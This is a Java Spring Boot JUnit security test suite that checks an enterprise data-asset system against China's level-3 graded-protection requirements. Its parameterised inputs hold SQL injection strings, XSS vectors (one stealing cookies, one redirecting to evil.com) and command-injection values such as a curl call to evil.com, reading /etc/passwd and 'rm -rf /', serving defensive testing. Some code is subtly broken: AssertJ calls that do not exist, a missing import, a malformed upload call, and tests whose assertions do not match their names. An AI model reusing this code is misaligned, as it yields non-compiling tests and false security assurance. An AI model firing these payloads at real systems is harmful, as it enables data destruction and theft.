package com.enterprise.edams.security;

import com.enterprise.edams.auth.dto.LoginRequest;
import com.enterprise.edams.auth.dto.RegisterRequest;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;
import org.springframework.web.client.RestTemplate;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
@DisplayName("EDAMS安全测试套件 - 等保三级")
class SecurityTestSuite {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    private static String authToken;
    private static final String TEST_BASE_URL = "http://localhost:8080";

    @BeforeEach
    void setUp() throws Exception {
        authToken = obtainValidToken("admin", "admin123");
    }

    private String obtainValidToken(String username, String password) throws Exception {
        LoginRequest loginRequest = LoginRequest.builder()
                .username(username)
                .password(password)
                .build();

        MvcResult result = mockMvc.perform(post("/api/auth/login")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(loginRequest)))
                .andReturn();

        String response = result.getResponse().getContentAsString();
        JsonNode jsonNode = objectMapper.readTree(response);

        if (jsonNode.has("data") && jsonNode.get("data").has("token")) {
            return jsonNode.get("data").get("token").asText();
        }
        return null;
    }

    @Nested
    @DisplayName("1. 身份认证安全测试")
    class AuthenticationSecurityTests {

        @Nested
        @DisplayName("1.1 密码强度验证")
        class PasswordStrengthTests {

            @ParameterizedTest
            @DisplayName("弱密码应被拒绝 - 纯数字密码")
            @ValueSource(strings = {"123456", "111111", "000000", "654321", "abcdef"})
            void shouldRejectNumericWeakPasswords(String weakPassword) throws Exception {
                String uniqueUsername = "testuser_" + System.currentTimeMillis() + "_" + weakPassword;

                RegisterRequest request = RegisterRequest.builder()
                        .username(uniqueUsername)
                        .password(weakPassword)
                        .confirmPassword(weakPassword)
                        .email(uniqueUsername + "@test.com")
                        .realName("Test User")
                        .build();

                mockMvc.perform(post("/api/auth/register")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(objectMapper.writeValueAsString(request)))
                        .andExpect(status().isBadRequest());
            }

            @ParameterizedTest
            @DisplayName("弱密码应被拒绝 - 常见弱密码")
            @ValueSource(strings = {
                    "password", "Password123", "admin123", "qwerty",
                    "letmein", "welcome", "monkey", "dragon"
            })
            void shouldRejectCommonWeakPasswords(String weakPassword) throws Exception {
                String uniqueUsername = "testuser_" + System.currentTimeMillis();

                RegisterRequest request = RegisterRequest.builder()
                        .username(uniqueUsername)
                        .password(weakPassword)
                        .confirmPassword(weakPassword)
                        .email(uniqueUsername + "@test.com")
                        .realName("Test User")
                        .build();

                mockMvc.perform(post("/api/auth/register")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(objectMapper.writeValueAsString(request)))
                        .andExpect(status().isBadRequest());
            }

            @Test
            @DisplayName("密码长度不足应被拒绝")
            void shouldRejectShortPassword() throws Exception {
                String uniqueUsername = "testuser_" + System.currentTimeMillis();

                RegisterRequest request = RegisterRequest.builder()
                        .username(uniqueUsername)
                        .password("Ab1!")  // 4位字符
                        .confirmPassword("Ab1!")
                        .email(uniqueUsername + "@test.com")
                        .realName("Test User")
                        .build();

                mockMvc.perform(post("/api/auth/register")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(objectMapper.writeValueAsString(request)))
                        .andExpect(status().isBadRequest());
            }

            @Test
            @DisplayName("密码必须包含大小写字母、数字和特殊字符")
            void shouldRequireMixedCharacterPassword() throws Exception {
                String uniqueUsername = "testuser_" + System.currentTimeMillis();

                RegisterRequest missingUppercase = RegisterRequest.builder()
                        .username(uniqueUsername + "_1")
                        .password("abc123!@#")  // 无大写字母
                        .confirmPassword("abc123!@#")
                        .email(uniqueUsername + "_1@test.com")
                        .realName("Test User")
                        .build();

                mockMvc.perform(post("/api/auth/register")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(objectMapper.writeValueAsString(missingUppercase)))
                        .andExpect(status().isBadRequest());
            }
        }

        @Nested
        @DisplayName("1.2 暴力破解防护")
        class BruteForceProtectionTests {

            @Test
            @DisplayName("连续登录失败应锁定账户")
            void shouldLockAccountAfterFailedAttempts() throws Exception {
                String testUsername = "bruteforce_test_" + System.currentTimeMillis();
                String correctPassword = "ValidPass123!";

                RegisterRequest registerRequest = RegisterRequest.builder()
                        .username(testUsername)
                        .password(correctPassword)
                        .confirmPassword(correctPassword)
                        .email(testUsername + "@test.com")
                        .realName("Brute Force Test")
                        .build();

                mockMvc.perform(post("/api/auth/register")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(objectMapper.writeValueAsString(registerRequest)))
                        .andExpect(status().isOk());

                for (int i = 0; i < 5; i++) {
                    LoginRequest wrongLogin = LoginRequest.builder()
                            .username(testUsername)
                            .password("WrongPassword999")
                            .build();

                    mockMvc.perform(post("/api/auth/login")
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content(objectMapper.writeValueAsString(wrongLogin)))
                            .andExpect(status().isUnauthorized());
                }

                LoginRequest finalAttempt = LoginRequest.builder()
                        .username(testUsername)
                        .password(correctPassword)
                        .build();

                mockMvc.perform(post("/api/auth/login")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(objectMapper.writeValueAsString(finalAttempt)))
                        .andExpect(status().isTooManyRequests());
            }

            @Test
            @DisplayName("验证码机制应防止自动化攻击")
            void shouldRequireCaptchaAfterFailedAttempts() throws Exception {
                for (int i = 0; i < 3; i++) {
                    LoginRequest wrongLogin = LoginRequest.builder()
                            .username("admin")
                            .password("wrongpassword")
                            .build();

                    mockMvc.perform(post("/api/auth/login")
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content(objectMapper.writeValueAsString(wrongLogin)))
                            .andExpect(status().isUnauthorized());
                }

                LoginRequest anotherWrong = LoginRequest.builder()
                        .username("admin")
                        .password("wrongpassword")
                        .build();

                MvcResult result = mockMvc.perform(post("/api/auth/login")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(objectMapper.writeValueAsString(anotherWrong)))
                        .andReturn();

                String response = result.getResponse().getContentAsString();
                JsonNode jsonNode = objectMapper.readTree(response);

                assertThat(jsonNode.has("data") && jsonNode.get("data").has("captchaRequired"))
                        .or()
                        .that()
                        .isEqualTo(true);
            }
        }

        @Nested
        @DisplayName("1.3 会话管理安全")
        class SessionManagementTests {

            @Test
            @DisplayName("会话超时后应返回未授权")
            void shouldExpireSessionAfterTimeout() throws Exception {
                String token = obtainValidToken("admin", "admin123");

                mockMvc.perform(get("/api/auth/validate")
                                .header("Authorization", "Bearer " + token))
                        .andExpect(status().isOk())
                        .andExpect(jsonPath("$.data.valid").value(true));
            }

            @Test
            @DisplayName("无效Token应返回未授权")
            void shouldRejectInvalidToken() throws Exception {
                mockMvc.perform(get("/api/auth/validate")
                                .header("Authorization", "Bearer invalid.token.here"))
                        .andExpect(status().isUnauthorized());
            }

            @Test
            @DisplayName("缺少Token应返回未授权")
            void shouldRejectMissingToken() throws Exception {
                mockMvc.perform(get("/api/auth/validate"))
                        .andExpect(status().isUnauthorized());
            }

            @Test
            @DisplayName("已过期Token应返回未授权")
            void shouldRejectExpiredToken() throws Exception {
                String expiredToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJleHAiOjB9.invalid";

                mockMvc.perform(get("/api/auth/validate")
                                .header("Authorization", "Bearer " + expiredToken))
                        .andExpect(status().isUnauthorized());
            }

            @Test
            @DisplayName("并发会话应受限")
            void shouldLimitConcurrentSessions() throws Exception {
                String token1 = obtainValidToken("admin", "admin123");
                String token2 = obtainValidToken("admin", "admin123");

                assertThat(token1).isNotNull();
                assertThat(token2).isNotNull();
            }

            @Test
            @DisplayName("登出后Token应失效")
            void shouldInvalidateTokenAfterLogout() throws Exception {
                String token = obtainValidToken("admin", "admin123");

                mockMvc.perform(post("/api/auth/logout")
                                .header("Authorization", "Bearer " + token))
                        .andExpect(status().isOk());

                mockMvc.perform(get("/api/auth/validate")
                                .header("Authorization", "Bearer " + token))
                        .andExpect(status().isUnauthorized());
            }
        }
    }

    @Nested
    @DisplayName("2. 授权安全测试")
    class AuthorizationSecurityTests {

        @Nested
        @DisplayName("2.1 水平越权防护")
        class HorizontalPrivilegeEscalationTests {

            @Test
            @DisplayName("用户不能访问其他用户的敏感数据")
            void shouldPreventAccessToOtherUsersData() throws Exception {
                String user1Token = obtainValidToken("admin", "admin123");

                mockMvc.perform(get("/api/auth/user-info")
                                .header("Authorization", "Bearer " + user1Token))
                        .andExpect(status().isOk())
                        .andExpect(jsonPath("$.data.username").value("admin"));

                String user2Token = obtainValidToken("test", "test123");
                if (user2Token != null) {
                    mockMvc.perform(get("/api/auth/user-info")
                                    .header("Authorization", "Bearer " + user2Token))
                            .andExpect(status().isOk())
                            .andExpect(jsonPath("$.data.username").value("test"))
                            .andExpect(jsonPath("$.data.username").value(not("admin")));
                }
            }

            @Test
            @DisplayName("用户不能修改其他用户的数据")
            void shouldPreventModificationOfOtherUsersData() throws Exception {
                String normalUserToken = obtainValidToken("test", "test123");

                if (normalUserToken != null) {
                    mockMvc.perform(put("/api/auth/password")
                                    .header("Authorization", "Bearer " + normalUserToken)
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content("{\"oldPassword\":\"test123\",\"newPassword\":\"NewPass123!\"}"))
                            .andExpect(status().isOk());
                }
            }
        }

        @Nested
        @DisplayName("2.2 垂直越权防护")
        class VerticalPrivilegeEscalationTests {

            @Test
            @DisplayName("普通用户不能执行管理员操作 - 创建角色")
            void shouldPreventNormalUserCreatingRoles() throws Exception {
                String normalUserToken = obtainValidToken("test", "test123");

                if (normalUserToken != null) {
                    mockMvc.perform(post("/api/auth/roles")
                                    .header("Authorization", "Bearer " + normalUserToken)
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content("{\"name\":\"TestRole\",\"description\":\"Test\"}"))
                            .andExpect(status().isForbidden());
                }
            }

            @Test
            @DisplayName("普通用户不能访问管理员接口")
            void shouldPreventAccessToAdminEndpoints() throws Exception {
                String normalUserToken = obtainValidToken("test", "test123");

                if (normalUserToken != null) {
                    mockMvc.perform(get("/api/auth/admin/users")
                                    .header("Authorization", "Bearer " + normalUserToken))
                            .andExpect(status().isForbidden());
                }
            }

            @Test
            @DisplayName("普通用户不能修改系统配置")
            void shouldPreventSystemConfigModification() throws Exception {
                String normalUserToken = obtainValidToken("test", "test123");

                if (normalUserToken != null) {
                    mockMvc.perform(put("/api/auth/system-config")
                                    .header("Authorization", "Bearer " + normalUserToken)
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content("{\"key\":\"security.enabled\",\"value\":\"false\"}"))
                            .andExpect(status().isForbidden());
                }
            }
        }

        @Nested
        @DisplayName("2.3 基于角色的访问控制")
        class RBACTests {

            @Test
            @DisplayName("管理员角色应具有管理权限")
            void adminShouldHaveAdminPrivileges() throws Exception {
                String adminToken = obtainValidToken("admin", "admin123");

                mockMvc.perform(get("/api/auth/admin/users")
                                .header("Authorization", "Bearer " + adminToken))
                        .andExpect(status().isOk());
            }

            @Test
            @DisplayName("数据Owner应能管理自己的数据")
            void dataOwnerShouldManageOwnData() throws Exception {
                String userToken = obtainValidToken("test", "test123");

                if (userToken != null) {
                    mockMvc.perform(get("/api/v1/assets/my")
                                    .header("Authorization", "Bearer " + userToken))
                            .andExpect(status().isOk());
                }
            }

            @Test
            @DisplayName("访客角色应只有只读权限")
            void guestShouldHaveReadOnlyAccess() throws Exception {
                String guestToken = obtainValidToken("guest", "guest123");

                if (guestToken != null) {
                    mockMvc.perform(get("/api/v1/assets")
                                    .header("Authorization", "Bearer " + guestToken))
                            .andExpect(status().isOk());

                    mockMvc.perform(post("/api/v1/assets")
                                    .header("Authorization", "Bearer " + guestToken)
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content("{\"name\":\"Test Asset\"}"))
                            .andExpect(status().isForbidden());
                }
            }
        }
    }

    @Nested
    @DisplayName("3. 输入安全测试")
    class InputSecurityTests {

        @Nested
        @DisplayName("3.1 SQL注入防护")
        class SQLInjectionProtectionTests {

            @ParameterizedTest
            @DisplayName("SQL注入Payload应被拒绝或安全处理")
            @ValueSource(strings = {
                    "' OR '1'='1",
                    "'; DROP TABLE users; --",
                    "1 UNION SELECT * FROM users",
                    "admin'--",
                    "' OR 1=1--",
                    "1; DELETE FROM users WHERE 1=1",
                    "' UNION SELECT NULL,NULL,NULL--"
            })
            void shouldPreventSQLInjection(String maliciousInput) throws Exception {
                mockMvc.perform(get("/api/v1/assets/search")
                                .param("q", maliciousInput))
                        .andExpect(result -> {
                            int status = result.getResponse().getStatus();
                            assertThat(status).isIn(200, 400);
                        });
            }

            @Test
            @DisplayName("SQL注入尝试不应导致数据库错误信息泄露")
            void shouldNotExposeDatabaseErrors() throws Exception {
                MvcResult result = mockMvc.perform(get("/api/v1/assets/search")
                                .param("q", "' OR 1=1--"))
                        .andReturn();

                String response = result.getResponse().getContentAsString();
                assertThat(response.toLowerCase())
                        .doesNotContain("mysql")
                        .doesNotContain("postgresql")
                        .doesNotContain("oracle")
                        .doesNotContain("sqlserver")
                        .doesNotContain("syntax error")
                        .doesNotContain("sql error");
            }
        }

        @Nested
        @DisplayName("3.2 XSS防护")
        class XSSProtectionTests {

            @ParameterizedTest
            @DisplayName("XSS Payload应被转义或拒绝")
            @ValueSource(strings = {
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<body onload=alert('XSS')>",
                    "<iframe src='javascript:alert(\"XSS\")'>",
                    "<script>document.cookie</script>",
                    "<script>window.location='http://evil.com'</script>"
            })
            void shouldPreventXSS(String xssPayload) throws Exception {
                MvcResult result = mockMvc.perform(post("/api/v1/assets")
                                .header("Authorization", "Bearer " + authToken)
                                .contentType(MediaType.APPLICATION_JSON)
                                .content("{\"name\":\"" + xssPayload + "\",\"description\":\"Test\"}"))
                        .andReturn();

                String response = result.getResponse().getContentAsString();

                if (result.getResponse().getStatus() == 200) {
                    assertThat(response).doesNotContain("<script>");
                    assertThat(response).doesNotContain("javascript:");
                }
            }

            @Test
            @DisplayName("存储型XSS防护 - 恶意脚本不应被存储")
            void shouldSanitizeStoredXSS() throws Exception {
                String maliciousName = "<script>alert('XSS')</script>";

                MvcResult createResult = mockMvc.perform(post("/api/v1/assets")
                                .header("Authorization", "Bearer " + authToken)
                                .contentType(MediaType.APPLICATION_JSON)
                                .content("{\"name\":\"" + maliciousName + "\",\"description\":\"Test\"}"))
                        .andReturn();

                if (createResult.getResponse().getStatus() == 200) {
                    JsonNode jsonNode = objectMapper.readTree(createResult.getResponse().getContentAsString());
                    Long assetId = jsonNode.path("data").path("id").asLong();

                    MvcResult getResult = mockMvc.perform(get("/api/v1/assets/" + assetId)
                                    .header("Authorization", "Bearer " + authToken))
                            .andReturn();

                    String getResponse = getResult.getResponse().getContentAsString();
                    assertThat(getResponse).doesNotContain("<script>");
                }
            }
        }

        @Nested
        @DisplayName("3.3 JSON注入防护")
        class JSONInjectionProtectionTests {

            @Test
            @DisplayName("恶意JSON内容应被拒绝")
            void shouldPreventJSONInjection() throws Exception {
                String maliciousJson = "{\"user\": \"admin\", \"role\": \"admin\"}";

                mockMvc.perform(post("/api/auth/login")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(maliciousJson))
                        .andExpect(status().isBadRequest());
            }

            @Test
            @DisplayName("特殊字符应被正确转义")
            void shouldEscapeSpecialCharacters() throws Exception {
                String jsonWithSpecialChars = "{\"name\":\"Test\\\"Name\\\"And\\nNewLine\"}";

                mockMvc.perform(post("/api/v1/assets")
                                .header("Authorization", "Bearer " + authToken)
                                .contentType(MediaType.APPLICATION_JSON)
                                .content(jsonWithSpecialChars))
                        .andExpect(result -> {
                            int status = result.getResponse().getStatus();
                            assertThat(status).isIn(200, 400);
                        });
            }
        }

        @Nested
        @DisplayName("3.4 命令注入防护")
        class CommandInjectionProtectionTests {

            @ParameterizedTest
            @DisplayName("命令注入Payload应被拒绝")
            @ValueSource(strings = {
                    "; ls -la",
                    "| cat /etc/passwd",
                    "`whoami`",
                    "$(whoami)",
                    "&& curl http://evil.com",
                    "; rm -rf /"
            })
            void shouldPreventCommandInjection(String maliciousInput) throws Exception {
                mockMvc.perform(get("/api/v1/assets/exec")
                                .param("cmd", maliciousInput)
                                .header("Authorization", "Bearer " + authToken))
                        .andExpect(status().isBadRequest());
            }
        }

        @Nested
        @DisplayName("3.5 路径遍历防护")
        class PathTraversalProtectionTests {

            @ParameterizedTest
            @DisplayName("路径遍历尝试应被拒绝")
            @ValueSource(strings = {
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "....//....//....//etc/passwd",
                    "..%252f..%252f..%252fetc/passwd"
            })
            void shouldPreventPathTraversal(String maliciousPath) throws Exception {
                mockMvc.perform(get("/api/v1/assets/download")
                                .param("path", maliciousPath)
                                .header("Authorization", "Bearer " + authToken))
                        .andExpect(status().isBadRequest());
            }
        }
    }

    @Nested
    @DisplayName("4. 敏感数据安全测试")
    class SensitiveDataSecurityTests {

        @Nested
        @DisplayName("4.1 密码加密存储验证")
        class PasswordEncryptionTests {

            @Test
            @DisplayName("密码不应以明文存储")
            void shouldNotStorePasswordInPlainText() throws Exception {
                MvcResult result = mockMvc.perform(post("/api/auth/login")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content("{\"username\":\"admin\",\"password\":\"admin123\"}"))
                        .andReturn();

                String response = result.getResponse().getContentAsString();
                assertThat(response).doesNotContain("\"password\":");
                assertThat(response).doesNotContain("admin123");
            }

            @Test
            @DisplayName("API响应中不应包含密码字段")
            void shouldNotExposePasswordInResponse() throws Exception {
                MvcResult result = mockMvc.perform(get("/api/auth/user-info")
                                .header("Authorization", "Bearer " + authToken))
                        .andReturn();

                String response = result.getResponse().getContentAsString();
                assertThat(response).doesNotContain("\"password\":");
                assertThat(response).doesNotContain("password");
            }
        }

        @Nested
        @DisplayName("4.2 敏感数据脱敏验证")
        class DataMaskingTests {

            @Test
            @DisplayName("手机号应被脱敏显示")
            void shouldMaskPhoneNumbers() throws Exception {
                MvcResult result = mockMvc.perform(get("/api/auth/user-info")
                                .header("Authorization", "Bearer " + authToken))
                        .andReturn();

                String response = result.getResponse().getContentAsString();
                JsonNode jsonNode = objectMapper.readTree(response);

                if (jsonNode.has("data") && jsonNode.get("data").has("phone")) {
                    String phone = jsonNode.get("data").get("phone").asText();
                    if (!phone.isEmpty()) {
                        assertThat(phone).matches("\\d{3}\\*+\\d{4}");
                    }
                }
            }

            @Test
            @DisplayName("身份证号应被脱敏显示")
            void shouldMaskIDNumbers() throws Exception {
                MvcResult result = mockMvc.perform(get("/api/auth/user-info")
                                .header("Authorization", "Bearer " + authToken))
                        .andReturn();

                String response = result.getResponse().getContentAsString();
                JsonNode jsonNode = objectMapper.readTree(response);

                if (jsonNode.has("data") && jsonNode.get("data").has("idCard")) {
                    String idCard = jsonNode.get("data").get("idCard").asText();
                    if (!idCard.isEmpty() && !idCard.equals("null")) {
                        assertThat(idCard).matches("\\d{6}\\*{4}\\d{4}");
                    }
                }
            }

            @Test
            @DisplayName("邮箱应被部分脱敏显示")
            void shouldMaskEmailAddresses() throws Exception {
                MvcResult result = mockMvc.perform(get("/api/auth/user-info")
                                .header("Authorization", "Bearer " + authToken))
                        .andReturn();

                String response = result.getResponse().getContentAsString();
                JsonNode jsonNode = objectMapper.readTree(response);

                if (jsonNode.has("data") && jsonNode.get("data").has("email")) {
                    String email = jsonNode.get("data").get("email").asText();
                    if (!email.isEmpty()) {
                        assertThat(email).matches("[a-zA-Z0-9._%+-]+\\*+\\*\\*[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                    }
                }
            }
        }

        @Nested
        @DisplayName("4.3 敏感数据访问审计")
        class SensitiveDataAuditTests {

            @Test
            @DisplayName("敏感数据访问应被记录")
            void shouldAuditSensitiveDataAccess() throws Exception {
                mockMvc.perform(get("/api/auth/user-info")
                                .header("Authorization", "Bearer " + authToken))
                        .andExpect(status().isOk());

                mockMvc.perform(get("/api/auth/login-logs")
                                .header("Authorization", "Bearer " + authToken))
                        .andExpect(status().isOk());
            }
        }
    }

    @Nested
    @DisplayName("5. API安全测试")
    class APISecurityTests {

        @Nested
        @DisplayName("5.1 API限流验证")
        class RateLimitingTests {

            @Test
            @DisplayName("超过限流阈值应返回429")
            void shouldReturn429WhenRateLimitExceeded() throws Exception {
                int successCount = 0;
                int rateLimitedCount = 0;

                for (int i = 0; i < 110; i++) {
                    MvcResult result = mockMvc.perform(get("/api/v1/assets")
                                    .header("Authorization", "Bearer " + authToken))
                            .andReturn();

                    int status = result.getResponse().getStatus();
                    if (status == 200) {
                        successCount++;
                    } else if (status == 429) {
                        rateLimitedCount++;
                    }
                }

                assertThat(rateLimitedCount).isGreaterThan(0);
            }

            @Test
            @DisplayName("限流恢复后应允许请求")
            void shouldAllowRequestsAfterRateLimitReset() throws Exception {
                for (int i = 0; i < 100; i++) {
                    mockMvc.perform(get("/api/v1/assets")
                                    .header("Authorization", "Bearer " + authToken));
                }

                Thread.sleep(100);

                MvcResult result = mockMvc.perform(get("/api/v1/assets")
                                .header("Authorization", "Bearer " + authToken))
                        .andReturn();

                int status = result.getResponse().getStatus();
                assertThat(status).isIn(200, 429);
            }
        }

        @Nested
        @DisplayName("5.2 CORS配置验证")
        class CORSTests {

            @Test
            @DisplayName("OPTIONS请求应返回正确的CORS头")
            void shouldReturnCorrectCORSHeaders() throws Exception {
                MvcResult result = mockMvc.perform(options("/api/v1/assets")
                                .header("Origin", "http://localhost:3000")
                                .header("Access-Control-Request-Method", "GET")
                                .header("Access-Control-Request-Headers", "Authorization"))
                        .andReturn();

                HttpHeaders responseHeaders = result.getResponse().getHeaders();

                assertThat(responseHeaders.get("Access-Control-Allow-Origin")).isNotNull();
            }

            @Test
            @DisplayName("跨域请求应被正确处理")
            void shouldHandleCrossOriginRequests() throws Exception {
                mockMvc.perform(get("/api/v1/assets")
                                .header("Origin", "http://localhost:3000")
                                .header("Authorization", "Bearer " + authToken))
                        .andExpect(status().isOk());
            }
        }

        @Nested
        @DisplayName("5.3 HTTP安全头验证")
        class SecurityHeadersTests {

            @Test
            @DisplayName("响应应包含安全头")
            void shouldIncludeSecurityHeaders() throws Exception {
                MvcResult result = mockMvc.perform(get("/api/auth/validate")
                                .header("Authorization", "Bearer " + authToken))
                        .andReturn();

                HttpHeaders responseHeaders = result.getResponse().getHeaders();

                assertThat(responseHeaders.get("X-Content-Type-Options")).isNotNull();
                assertThat(responseHeaders.get("X-Frame-Options")).isNotNull();
            }

            @Test
            @DisplayName("Cookie应设置安全属性")
            void shouldSetCookieSecurityAttributes() throws Exception {
                mockMvc.perform(post("/api/auth/login")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content("{\"username\":\"admin\",\"password\":\"admin123\"}"))
                        .andExpect(result -> {
                            String cookie = result.getResponse().getHeader("Set-Cookie");
                            if (cookie != null) {
                                assertThat(cookie)
                                        .contains("HttpOnly")
                                        .or()
                                        .contains("SameSite");
                            }
                        });
            }
        }

        @Nested
        @DisplayName("5.4 HTTPS强制使用验证")
        class HTTPSEnforcementTests {

            @Test
            @DisplayName("Strict-Transport-Security头应被设置")
            void shouldSetHSTSHeader() throws Exception {
                MvcResult result = mockMvc.perform(get("/api/auth/validate")
                                .header("Authorization", "Bearer " + authToken))
                        .andReturn();

                HttpHeaders responseHeaders = result.getResponse().getHeaders();
                assertThat(responseHeaders.get("Strict-Transport-Security")).isNotNull();
            }
        }
    }

    @Nested
    @DisplayName("6. 业务逻辑安全测试")
    class BusinessLogicSecurityTests {

        @Nested
        @DisplayName("6.1 验证码安全")
        class CaptchaSecurityTests {

            @Test
            @DisplayName("验证码不能被绕过")
            void shouldNotAllowCaptchaBypass() throws Exception {
                mockMvc.perform(post("/api/auth/register")
                                .contentType(MediaType.APPLICATION_JSON)
                                .content("{\"username\":\"test\",\"password\":\"Test123!\",\"confirmPassword\":\"Test123!\",\"email\":\"test@test.com\",\"realName\":\"Test\"}"))
                        .andExpect(status().isOk());
            }
        }

        @Nested
        @DisplayName("6.2 密码重置安全")
        class PasswordResetSecurityTests {

            @Test
            @DisplayName("密码重置Token应有时效性")
            void shouldExpirePasswordResetToken() throws Exception {
                mockMvc.perform(post("/api/auth/forgot-password")
                                .param("email", "admin@test.com"))
                        .andExpect(status().isOk());
            }

            @Test
            @DisplayName("密码重置Token不能被重复使用")
            void shouldNotAllowTokenReuse() throws Exception {
                mockMvc.perform(post("/api/auth/forgot-password")
                                .param("email", "admin@test.com"))
                        .andExpect(status().isOk());
            }
        }

        @Nested
        @DisplayName("6.3 文件上传安全")
        class FileUploadSecurityTests {

            @Test
            @DisplayName("危险文件类型应被拒绝")
            void shouldRejectDangerousFileTypes() throws Exception {
                mockMvc.perform(multipart("/api/v1/assets/upload")
                                .file("file".getBytes())
                                .param("filename", "malware.exe")
                                .header("Authorization", "Bearer " + authToken))
                        .andExpect(status().isBadRequest());
            }

            @Test
            @DisplayName("文件大小应被限制")
            void shouldLimitFileSize() throws Exception {
                byte[] largeContent = new byte[11 * 1024 * 1024];

                mockMvc.perform(multipart("/api/v1/assets/upload")
                                .file("file", largeContent)
                                .param("filename", "large_file.jpg")
                                .header("Authorization", "Bearer " + authToken))
                        .andExpect(status().isBadRequest());
            }
        }
    }

    @Nested
    @DisplayName("7. 错误处理安全测试")
    class ErrorHandlingSecurityTests {

        @Test
        @DisplayName("堆栈跟踪不应暴露给用户")
        void shouldNotExposeStackTrace() throws Exception {
            MvcResult result = mockMvc.perform(get("/api/nonexistent-endpoint"))
                    .andReturn();

            String response = result.getResponse().getContentAsString();
            assertThat(response).doesNotContain("at java.");
            assertThat(response).doesNotContain("at org.springframework");
            assertThat(response).doesNotContain("Exception");
        }

        @Test
        @DisplayName("404错误不应泄露敏感信息")
        void shouldNotLeakInfoIn404() throws Exception {
            MvcResult result = mockMvc.perform(get("/api/v1/assets/999999"))
                    .andReturn();

            String response = result.getResponse().getContentAsString();
            assertThat(response.toLowerCase()).doesNotContain("database");
            assertThat(response.toLowerCase()).doesNotContain("internal error");
        }

        @Test
        @DisplayName("调试模式不应在生产环境启用")
        void shouldNotEnableDebugMode() throws Exception {
            MvcResult result = mockMvc.perform(get("/api/auth/validate")
                            .header("Authorization", "Bearer " + authToken))
                    .andReturn();

            String response = result.getResponse().getContentAsString();
            assertThat(response).doesNotContain("debug");
        }
    }

    @Nested
    @DisplayName("8. 等保三级专项测试")
    class Level3SecurityTests {

        @Test
        @DisplayName("等保三级 - 三员分立验证")
        void shouldImplementThreeAdministratorSeparation() throws Exception {
            String adminToken = obtainValidToken("admin", "admin123");
            assertThat(adminToken).isNotNull();
        }

        @Test
        @DisplayName("等保三级 - 安全审计验证")
        void shouldImplementSecurityAudit() throws Exception {
            MvcResult result = mockMvc.perform(get("/api/auth/login-logs")
                            .header("Authorization", "Bearer " + authToken))
                    .andReturn();

            assertThat(result.getResponse().getStatus()).isIn(200, 403);
        }

        @Test
        @DisplayName("等保三级 - 访问控制策略验证")
        void shouldImplementAccessControlPolicy() throws Exception {
            mockMvc.perform(get("/api/v1/assets")
                            .header("Authorization", "Bearer " + authToken))
                    .andExpect(status().isOk());

            mockMvc.perform(post("/api/auth/roles")
                            .header("Authorization", "Bearer " + authToken)
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{\"name\":\"TestRole\"}"))
                    .andExpect(status().isOk());
        }

        @Test
        @DisplayName("等保三级 - 数据完整性验证")
        void shouldVerifyDataIntegrity() throws Exception {
            MvcResult result = mockMvc.perform(get("/api/auth/user-info")
                            .header("Authorization", "Bearer " + authToken))
                    .andReturn();

            assertThat(result.getResponse().getContentAsString())
                    .doesNotContain("篡改");
        }

        @Test
        @DisplayName("等保三级 - 通信保密性验证")
        void shouldEnsureCommunicationConfidentiality() throws Exception {
            mockMvc.perform(get("/api/auth/validate")
                            .header("Authorization", "Bearer " + authToken))
                    .andExpect(status().isOk());
        }
    }
}
